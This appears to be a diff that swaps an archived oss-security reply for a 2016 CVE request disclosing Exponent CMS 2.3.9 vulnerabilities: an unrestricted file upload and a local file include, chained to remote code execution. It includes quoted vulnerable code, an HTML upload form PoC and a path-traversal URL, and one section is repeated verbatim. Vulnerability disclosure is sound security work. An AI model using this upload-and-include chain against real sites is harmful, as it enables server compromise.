@@ -1,19 +1,152 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/17/6
-Message-ID: <20160317184754.GA5283@pisco.westfalen.local>
-Date: Thu, 17 Mar 2016 19:47:54 +0100
-From: Moritz Muehlenhoff <jmm@...ian.org>
-To: oss-security@...ts.openwall.com
-Cc: cve-assign@...re.org
-Subject: Re: Re: Three CVE requests for PHP
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/21/4
+Message-ID: <tencent_4B081AB504A3C52B508F84E3@qq.com>
+Date: Wed, 21 Sep 2016 10:08:21 +0800
+From: "DM_" <contact@...ay.me>
+To: "oss-security" <oss-security@...ts.openwall.com>
+Subject: CVE request：Exponent CMS 2.3.9 Unrestricted File Upload RCE and Local File include vulnerability
 Content-Type: text/plain; charset=utf-8
 
-On Wed, Mar 16, 2016 at 07:03:44PM -0400, cve-assign@...re.org wrote:
-> We don't see any issue with re-opening the discussion at this
-> point, but could you please provide new information or a
-> counterargument?
+Hi,
 
-Fine with me, I missed the earlier discussion.
 
-Cheers,
-        Moritz
+This is YongXiao Ma of Silence's PKAV Team. I reported some security issues to ExponentCMS some days ago. 
+
+
+# Test environment
+exponent version: latest 2.3.9
+php: 5.5.x
+server: apache 2.2.x
+
+
+# Details
+
+
+1. Unrestricted File Upload
+there is a unrestricted file upload issue at framework/modules/forms/controllers/formsController.php and the upload file is located at /tmp/, where php script can be executed.
+
+
+although we dont know file name, but we can brute it simply, such as time() + "_" + upload name.
+
+
+    public function import_csv_mapper() {
+        //Check to make sure the user filled out the required input.
+        if (!is_numeric($this->params["rowstart"])) {
+            unset($this->params["rowstart"]);
+            $this->params['_formError'] = gt('The starting row must be a number.');
+            expSession::set("last_POST", $this->params);
+            header("Location: " . $_SERVER['HTTP_REFERER']);
+            exit('Redirecting...');
+        }
+
+
+        if (!empty($this->params['forms_id'])) {
+            // if we are importing to an existing form, jump to that step
+            $this->import_csv_data_mapper();
+        } else {
+            //Get the temp directory to put the uploaded file
+            $directory = "tmp";
+
+
+            //Get the file save it to the temp directory
+            if ($_FILES["upload"]["error"] == UPLOAD_ERR_OK) {
+                //	$file = file::update("upload",$directory,null,time()."_".$_FILES['upload']['name']);
+                $file = expFile::fileUpload("upload", false, false, time() . "_" . $_FILES['upload']['name'], $directory.'/'); //FIXME quick hack to remove file model
+	....
+
+
+POC: 
+
+
+	<!DOCTYPE html>
+	<html>
+	<form action="http://localhost/exponent-2.3.9/index.php?controller=forms&action=import_csv_mapper&forms_id=1&rowstart=0" method="POST" enctype ="multipart/form-data">
+	<input type="file" name="upload">	
+	<input type="submit" name="submit">
+
+
+	</form>
+	</html>
+
+
+2. LFI
+
+
+then LFI comes, at exponent-2.3.9/install/popup.php.
+
+
+    <?php
+    $page = (isset($_REQUEST['page']) ? expString::sanitize($_REQUEST['page']) : '');
+    if (is_readable('popups/' . $page . '.php')) {
+        include('popups/' . $page . '.php');
+    }
+    ?>
+
+
+so we can upload a php file, then include it to make a RCE again.
+
+
+POC: 
+	http://127.0.0.1/exponent-2.3.9/install/popup.php?page=../../files/test
+
+
+
+
+3. Unrestricted File Upload and RCE
+
+
+there is a unrestricted file upload issue at framework/modules/forms/controllers/formsController.php and the upload file is located at /tmp/, where php script can be executed.
+
+
+although we dont know file name, but we can brute it simply, such as time() + "_" + name.
+
+
+    public function import_csv_mapper() {
+        //Check to make sure the user filled out the required input.
+        if (!is_numeric($this->params["rowstart"])) {
+            unset($this->params["rowstart"]);
+            $this->params['_formError'] = gt('The starting row must be a number.');
+            expSession::set("last_POST", $this->params);
+            header("Location: " . $_SERVER['HTTP_REFERER']);
+            exit('Redirecting...');
+        }
+
+
+        if (!empty($this->params['forms_id'])) {
+            // if we are importing to an existing form, jump to that step
+            $this->import_csv_data_mapper();
+        } else {
+            //Get the temp directory to put the uploaded file
+            $directory = "tmp";
+
+
+            //Get the file save it to the temp directory
+            if ($_FILES["upload"]["error"] == UPLOAD_ERR_OK) {
+                //	$file = file::update("upload",$directory,null,time()."_".$_FILES['upload']['name']);
+                $file = expFile::fileUpload("upload", false, false, time() . "_" . $_FILES['upload']['name'], $directory.'/'); //FIXME quick hack to remove file model
+	....
+
+
+POC: 
+
+
+	<!DOCTYPE html>
+	<html>
+	<form action="http://localhost/exponent-2.3.9/index.php?controller=forms&action=import_csv_mapper&forms_id=1&rowstart=0" method="POST" enctype ="multipart/form-data">
+	<input type="file" name="upload">	
+	<input type="submit" name="submit">
+
+
+	</form>
+	</html>
+
+
+
+
+
+
+# Patches
+
+
+https://exponentcms.lighthouseapp.com/projects/61783/changesets/355702a9835cf527796c9d469a82258b7639148a
+https://exponentcms.lighthouseapp.com/projects/61783/changesets/628ea61834d92611644a1dfc1ba24216ee647c59
